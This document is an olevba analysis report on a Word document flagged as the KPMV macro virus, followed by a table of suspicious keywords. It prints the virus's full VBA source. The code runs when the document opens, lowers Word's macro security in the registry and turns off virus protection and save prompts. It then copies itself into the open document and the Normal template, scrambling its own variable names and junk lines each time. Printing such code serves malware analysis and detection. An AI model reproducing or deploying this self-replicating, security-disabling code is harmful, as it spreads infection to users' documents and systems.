olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-68cdc42373e58c41c01d22699f002290e1957a12cc65f39647b30cad8f1953fb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-68cdc42373e58c41c01d22699f002290e1957a12cc65f39647b30cad8f1953fb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
H3 = ne52f9A1F5f + C4L8f + R2R5z + T8L2y + I3Q0h + T7D7v + I7D6j + U8
Dim on26l8(27) As String: on26l8(0) = "xe01o9": on26l8(1) = "gc83o6": on26l8(2) = "gy05p5": on26l8(3) = "jf02t4": on26l8(4) = "ov72y2": on26l8(5) = "bs34c6": on26l8(6) = "jf02t4": on26l8(7) = "rr67k1": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
N2 = F2V6p + A3I4m + H4C4k + C8U5g + F6M7l + K8D8w + H7I8w + V1G5q + F8M3q + F5J2g + E0
on26l8(8) = "fn43i5": on26l8(9) = "up56s8": on26l8(10) = "gu76f4": on26l8(11) = "sv67c8": on26l8(12) = "or43n1": on26l8(13) = "on77j1": on26l8(14) = "kn76w2": on26l8(15) = "dx95z4": Options.VirusProtection = False
B5 = A8B9q + K6U3l + P0R2g + T8G2t + L3K6u + C1A5k + S4A8t + S5E1v + G7K3u + N6
on26l8(16) = "cf36x4": on26l8(17) = "fg22b3": on26l8(18) = "ne28y9": on26l8(19) = "wc18u6": on26l8(20) = "pp62s8": on26l8(21) = "vz55r6": on26l8(22) = "on26l8": on26l8(23) = "es88q2": Options.SaveNormalPrompt = False
M3 = G1R3h + R8K4k + D0S3i + H2Q6u + R3T3e + C3G6s + M7T5y + O4F1w + S1Q4i + P8O6y + A2H3f + K6
on26l8(24) = "rm17y6": on26l8(25) = "uv58t6": on26l8(26) = "ob54d8": on26l8(27) = "ne52f9": Options.ConfirmConversions = False
U3 = V6V1u + O5M5z + R7H8g + L7B7e + D7L3v + N8S8p + U3S3z + M0A4j + U4S6g + P1
Set xe01o9 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
M8 = B6Q2k + D6P2u + Q8L4w + B1
Set gc83o6 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
B5 = L1E9n + R1Q4t + S3P1n + K5V9i + H6D5o + Q6I5p + G8K5w + K8F3u + J3P8l + A2L5h + Q8
Set gy05p5 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
U4 = Q3B5g + M6M8s + H5A0j + T9J7x + I8J5l + B1A5v + V9B3i + A4O4o + A2D1e + S5A1w + O4
ov72y2 = "private sub" & " document_open()": bs34c6 = "end" & " sub"
J2 = J0I8y + G9N7y + U2L5t + E1R3s + U3L8v + M4K0l + C5J4z + R7K1i + A1H0z + E9S0q + S4A5q + L4
jf02t4 = gy05p5.Lines(1, gy05p5.CountOfLines)
T8 = D5M6q + T2M5i + N8A1r + I6D5y + N2H1e + C9A2h + K1I2f + O3G4r + C4J1x + J4S4p + J4
rr67k1 = InStr(LCase(jf02t4), ov72y2)
O9 = V5R8t + T8C9r + A9E4u + H3T1y + S2
fn43i5 = InStr(rr67k1, LCase(jf02t4), bs34c6) + Len(bs34c6)
U9 = A3H6i + P2U0n + C8T7z + N5J3n + K8B1s + I6
up56s8 = Mid(jf02t4, rr67k1, fn43i5 - rr67k1)
S2 = V1E7m + T1M2g + F5I4y + F4E8u + I7G0h + K7F0r + B9A3t + T0N9z + Q7
If xe01o9.CountOfLines <> 0 Then
B8 = C2G3q + D4F8k + L2H4s + O7P3k + B7U4m + N0A4t + R0R2q + Q4F7i + T1
gu76f4 = xe01o9.Lines(1, xe01o9.CountOfLines)
P0 = C3C4r + B4N3z + T7C6o + O6M8g + E1V5u + V4
If InStr(gu76f4, "(27) As String") = 0 Then
F4 = I1M4s + G0N1f + H5E2l + H3P9w + D6M9s + F5E2x + Q1U6v + N0D6v + F3B4q + L1H2p + B6
If InStr(LCase(gu76f4), ov72y2) <> 0 Then
O3 = P7L7o + E8K2g + O6I5x + T0F4s + H3T7t + U9
sv67c8 = False
E7 = M4N2j + F8N4t + V5N3l + K8U5k + L0E3f + J1E6t + V8T6x + M4J9i + L2D8k + L8
For or43n1 = 1 To xe01o9.CountOfLines: DoEvents
M2 = L7T2s + P7H8o + C8S6w + A1D7u + T8C9o + K6U8f + Q3T9u + D6I4l + R5A7q + V7Q2s + P7K1q + D8
If sv67c8 = False Then
H7 = R8G2f + B4G5p + V4N0j + H8J2f + G6
If LCase(xe01o9.Lines(or43n1, 1)) = ov72y2 Then
P8 = L1H7j + G7D4l + D3C0v + K4
sv67c8 = True
T6 = V5R5n + U1E7j + G7G6m + O5I2v + Q1Q1n + R8
on77j1 = or43n1
I3 = Q3B2w + N8O6k + N3C2x + D2U8u + F6E2u + U4K8s + A0E4r + Q9N5j + G4A3x + L9T8x + K4N2v + O8
End If
L9 = J8F9o + K5R6z + F0N7v + I8F0e + N1S1o + K9B1p + I6C1t + O4I9s + I7C4v + Q4T3x + A1
Else
I9 = V7U4u + E1R3p + F3
If LCase(xe01o9.Lines(or43n1, 1)) = bs34c6 Then
L8 = V4K7h + N2V6t + G5V9g + G6D2i + R8J4h + M6M7p + Q2Q4q + G9J5t + T5V7e + S3P7h + B7
kn76w2 = or43n1
H2 = M4F7g + A8T6l + J0I5s + P5
Exit For
G8 = E0O7l + L3G4p + B4J7r + K7U2i + C6M6n + G0
End If
J4 = A8A8n + T3O7s + C0S0y + I4S4m + G5D8f + I5R7p + O2
End If
R7 = M7P3t + N8P3h + K3O8s + A0A2q + G6H4k + F2Q5g + N8S5j + V6U1r + D6
Next
U4 = E7H6y + R0J6k + U0E4h + O0
xe01o9.DeleteLines on77j1, kn76w2 - (on77j1 - 1)
R6 = K3K6q + M7Q0q + F4A6p + H1Q2o + V1
End If
R6 = H1I8l + S0J6u + R5D0s + P4E6f + K5N5x + H5
Set dx95z4 = xe01o9
Q1 = M1D5s + O9R7w + U2I9l + N8
xe01o9.addfromstring up56s8: If ActiveDocument.Saved = False Then ActiveDocument.Save
B1 = J3L6g + J7N1s + J4K9j + R1F7k + M6I5n + A4G8i + F7D7z + J6N8q + S3
End If
H6 = O8H2g + I3I4q + H3L6s + S6S8r + N4U3y + R8C9z + R1
Else
L4 = O8D9f + T0B2r + G1F9x + N1O2p + B5F2v + E3M6t + I9B1e + F6A3u + M0P9y + C1R3f + G7
Set dx95z4 = xe01o9
J2 = D3U1w + H5O5z + B6J4w + P5T8s + D6E5m + E8
xe01o9.addfromstring up56s8: If ActiveDocument.Saved = False Then ActiveDocument.Save
N5 = B7I1g + J3D2y + K1A6u + B8
End If
V7 = O5B8r + F6S1s + B7I7z + B9L5k + G8C1q + I1B7j + A3G5f + S4L1k + F4P2l + S7R2t + M9
If gc83o6.CountOfLines <> 0 Then
J7 = V1A5i + L0S2e + N4C5e + G2J2z + C4U4o + T3H6g + Q3
cf36x4 = gc83o6.Lines(1, gc83o6.CountOfLines)
M0 = T7R2i + M8I2s + L7J8f + L3V0l + L7
If InStr(cf36x4, "(27) As String") = 0 Then
S7 = I4H7s + K2A0w + V8Q5v + V4
If InStr(LCase(cf36x4), ov72y2) <> 0 Then
N3 = K0T2p + Q8D9p + K1S5s + C2R6h + R1
sv67c8 = False
H2 = H5S7e + M8P6w + Q7D6m + I1
For or43n1 = 1 To gc83o6.CountOfLines: DoEvents
V9 = V9T0z + P4U3n + I0T2f + D7I7n + U4K1v + C9O7w + O7H8e + P7
If sv67c8 = False Then
U2 = E1N1n + N2R7u + E1
If LCase(gc83o6.Lines(or43n1, 1)) = ov72y2 Then
O6 = I6R0r + L4C5p + J6K6o + M7M1r + T1F7v + D7E8o + M1O2f + F0G6k + E3
sv67c8 = True
K8 = C3R9k + A6J7p + K7Q3i + M4
on77j1 = or43n1
P2 = I8U8y + Q4P1v + R2M5r + U6N6z + V6N6o + M7I8p + I7U5w + I0B4h + N0O9n + N5
End If
E4 = B1O1o + D5B9h + M5F1i + D8H0q + G8C7n + G2M4e + N7E6n + O1K0n + N3V0v + J5K3l + T4
Else
T9 = P8G2r + E8H0f + U0
If LCase(gc83o6.Lines(or43n1, 1)) = bs34c6 Then
L4 = F4U8l + F8K9s + G6A6h + C1T7z + E8L9h + P5F4f + K3
kn76w2 = or43n1
I1 = E6I1w + K5O8w + E7I4z + S8G5o + H0G0h + R8D3y + A2A3t + K4O5t + S4Q7k + P6I9k + J2
Exit For
C0 = C6J1m + N9P3l + O1V1g + M2A4u + P5
End If
O8 = P6F7i + O3V7l + H8G7e + P0
End If
T4 = S9C6p + F1O4w + D3V5u + A1T7o + N7Q7g + P7
Next
Q3 = G7E2l + V6R5q + C8M9t + S9G8r + U6
gc83o6.DeleteLines on77j1, kn76w2 - (on77j1 - 1)
K1 = U1B9g + E5B4q + C5J8j + F0
End If
A7 = L8B4x + O3D6k + J8U3l + G4T8w + S1G2t + C6M3n + B3A5k + J8C5n + R7E1v + T2M8o + N6
Set dx95z4 = gc83o6
M5 = T5T9x + Q1K4k + Q4U0y + G4Q6u + I7V9u + B5G6t + D2V2s + T1J4j + J5S1x + O1O6y + N6J9v + K6
gc83o6.addfromstring up56s8: If NormalTemplate.Saved = False Then NormalTemplate.Save
T5 = M0A7o + N7M5e + J2J5w + L0B7e + Q2N9p + N1S8p + L7U9t + R6E7s + L8U3w + P1
End If
H3 = O1S8e + C8P2u + M1
Else
P8 = L1B1h + D5F6h + Q3Q4t + K7R7h + J7V9i + U1F2i + I5
Set dx95z4 = gc83o6
D1 = T3M2q + J1F3u + A7R5f + V4L5i + O0S5x + P5B5g + O5
gc83o6.addfromstring up56s8: If NormalTemplate.Saved = False Then NormalTemplate.Save
D1 = M2E3t + K4L4r + H1J5l + O4C2p + E5F5s + N8P0i + F7H4n + J0C7p + S7
End If
Q9 = B4K5s + F2N7z + L6N2n + J6V6g + L7N5p + M6K0l + P9L1t + K1
If dx95z4 <> "" Then
B2 = N5J6t + D2S0q + J7C2k + I4L4h + Q0O3k + C8Q8s + U8U4x + H8D5y + U2F5k + A2
Dim fg22b3 As Long, ne28y9 As Long, wc18u6 As Long, pp62s8 As Long
N7 = B5K8v + N5G4r + P8L7r + I6S4q + K3L1p + V7R8t + K2E6l + V2E4v + U7V7s + T6A5f + J3
For vz55r6 = 0 To UBound(on26l8): DoEvents
S1 = U8C3x + P2U4t + N6
Randomize: es88q2 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
S3 = B3D7m + U2I7m + M4G4g + M2
fg22b3 = 1: ne28y9 = 1
A4 = N2V0y + A8Q8e + R4T6h + E2R9x + J5O8t + N4C8j + F8H4k + S6S2w + M1S5k + M1A7l + G9
With dx95z4
J1 = R2J3s + A6N0t + L4G1x + T6O0u + B7M3k + L9Q0r + S8C3j + G3Q3o + B7
Do While .Find(on26l8(vz55r6), fg22b3, ne28y9, wc18u6, pp62s8, True)
G4 = M7M1u + J4K3o + Q7D0s + H8G3v + P2R7l + I1I2q + M3D5s + T4
rm17y6 = .Lines(wc18u6, 1)
R3 = T4I9m + I4P5g + O9O9q + G5T1v + O1O3s + O9L7o + M8
uv58t6 = Mid(rm17y6, 1, ne28y9 - 1) & es88q2 & Mid(rm17y6, pp62s8)
G7 = T3M8l + K4H1m + G5T7t + A6
.replaceline wc18u6, uv58t6: DoEvents
G2 = L6N2k + N8L7z + E1R6v + B2V2e + K2E3f + A5G3n + E5B0k + D8L6y + Q8H2u + R2M5u + K9T2t + J5
fg22b3 = wc18u6
E6 = B1S6w + N5F4o + C5F2y + R6S3m + P5T9v + Q1K1f + R7A7q + M2S8m + O0K1q + E5
wc18u6 = .CountOfLines: ne28y9 = 1
L3 = A5K4p + O7H2j + U6N0j + O8H5m + H9G6x + S1F1q + G7
Loop
T2 = Q6E6p + U5O6g + M9T2h + D7I1t + I3
End With
Q2 = N7I2v + H5S7h + C2V2p + H7D8q + S5S9u + E7E8r + I8C1h + S0G8o + D0O1g + N4G1l + N5
Next
P5 = O4U6i + Q5A2l + B8P8p + I5O8i + Q8D3v + J7R6e + T4P4p + H1F0e + E4T7i + F4
With dx95z4
V2 = P6B5z + N6I9s + E1
For ob54d8 = 2 To (.CountOfLines - 1) Step 2: DoEvents
S7 = V0B5l + C4C7t + E4B6i + R5T9j + N5J6q + N8M4x + D0
For ne52f9 = 1 To (Int(Rnd * 10) + 2): DoEvents
N3 = U0B6w + F8D2i + I3L0x + R3Q1y + H6S1k + L6N8h + K9B4u + R5P7h + S8V1h + R1J1p + V3
Randomize: es88q2 = es88q2 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
V8 = I2I5t + U6R2l + J6R1u + C7I1j + A6J7s + B1A8y + C8M6n + T3I6j + V1A8n + L7Q4m + H6A3m + T1
Next ne52f9
O5 = F7D8g + V0T4j + O1S5u + D2R9n + M1P3i + R4M2z + F6E5z + N6F7q + K8U8q + U8Q8q + Q7
Randomize: .replaceline ob54d8, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & es88q2 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
R8 = D7B9i + E9H6y + C1H0q + O8A1u + F4M4f + E2G3h + T7O3x + E6A6p + I7K3l + V1
es88q2 = "": DoEvents
K5 = P1G2r + M8F3l + C5B3y + J3A4s + R5L8i + D2
Next ob54d8
A7 = O7T6p + I7O5n + F2G3s + K8J5z + Q3J0n + O4R4g + A8M6z + J1
End With
O5 = D1K2h + V6G8i + S2F4t + I8N8q + U9
End If
S2 = N1H2h + V7K1k + G5L6s + J1U5l + M6U3y + I3E6t + G8R1h + F3F6u + B2
'KPMV Word 2000 Macro Virus - By [K] - Virii Argentina - http://www.virii.com.ar
E8 = T5H6r + N3O2p + P0H8p + J8Q0g + V3D7u + A3
'February 2001 - Buenos Aires - Argentina
U9 = D4Q6s + B3R3f + C8I4l + D5U1x + Q2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.virii.com|URL                                          |
|          |.ar                 |                                             |
+----------+--------------------+---------------------------------------------+

